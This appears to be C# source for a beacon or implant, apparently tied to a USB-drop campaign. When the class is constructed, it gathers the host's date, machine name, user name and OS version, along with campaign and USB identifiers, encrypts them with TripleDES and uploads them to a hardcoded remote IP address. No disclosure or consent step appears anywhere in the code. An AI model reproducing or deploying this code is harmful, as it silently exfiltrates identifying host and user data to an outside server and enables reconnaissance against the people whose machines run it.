using System;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Net.Http;
using System.Xml;
using System.Net;
using System.Collections.Specialized;

namespace Crypto
{
	public class SystemInfo
	{
        public string date;
		public string networkInfo = "0";
		public string MachineName = "0";
		public string UserName = "0";
		public string SystemDirectory = "0";
		public string OsVersion = "0";
		public string campaignID;
        public string usbID;
		public string IP;
		private TripleDES tripleDES;



		public SystemInfo()
		{
			this.tripleDES = new TripleDES();
			this.gatherEncryptedInfo();
			this.sendData();

		}


		private void gatherEncryptedInfo()
		{

			XmlDocument xmlDoc = new XmlDocument(); // Create an XML document object
			xmlDoc.Load("conf.xml"); // Load the XML document from the specified file

			// Get elements

            this.date = this.tripleDES.EncryptData(DateTime.Now.ToString());
            if (xmlDoc.GetElementsByTagName("machineName")[0].InnerText == "1")
				this.MachineName = this.tripleDES.EncryptData(Environment.MachineName);
			if (xmlDoc.GetElementsByTagName("userName")[0].InnerText == "1")
				this.UserName = this.tripleDES.EncryptData(Environment.UserName);
			if (xmlDoc.GetElementsByTagName("netInfo")[0].InnerText == "1")
				this.networkInfo = this.tripleDES.EncryptData(this.getNetworkInfo());
			if (xmlDoc.GetElementsByTagName("osVersion")[0].InnerText == "1")
				this.OsVersion = this.tripleDES.EncryptData(Environment.OSVersion.ToString());
			this.IP = xmlDoc.GetElementsByTagName("IP")[0].InnerText;
			this.campaignID = this.tripleDES.EncryptData(xmlDoc.GetElementsByTagName("campID")[0].InnerText);
            this.usbID = this.tripleDES.EncryptData(xmlDoc.GetElementsByTagName("usbID")[0].InnerText);


        }



        public void print()
		{
			
			System.Diagnostics.Debug.WriteLine("machine = " + this.tripleDES.DecryptData(this.MachineName));
		}

		private string getNetworkInfo()

		{
			return "si";

		}

		//private void sendData()
	//	{
		//	string URI = "localhost/info.php;
		//	string myParameters = "machineName="+ this.MachineName +"&userName=" + this.UserName + "&netInfo=" + this.networkInfo + "&osVersion=" + this.OsVersion + "&idCampaign" + this.campaignID;

//			using (WebClient wc = new WebClient())
	//		{
		//		wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
			//	string HtmlResult = wc.UploadString(URI, myParameters);
		//	}

//		}


        private void sendData()
        {

            using (WebClient client = new WebClient())
            {

                byte[] response =
                client.UploadValues("http://51.255.195.153/info.php", new NameValueCollection()
                {
           { "date", this.date },
           { "machineName", this.MachineName},
           { "userName", this.UserName },
           { "idUsb", this.usbID },
           { "osVersion", this.OsVersion},
           { "idCampaign", this.campaignID}
                });

                string result = System.Text.Encoding.UTF8.GetString(response);
            }
}

	}

}







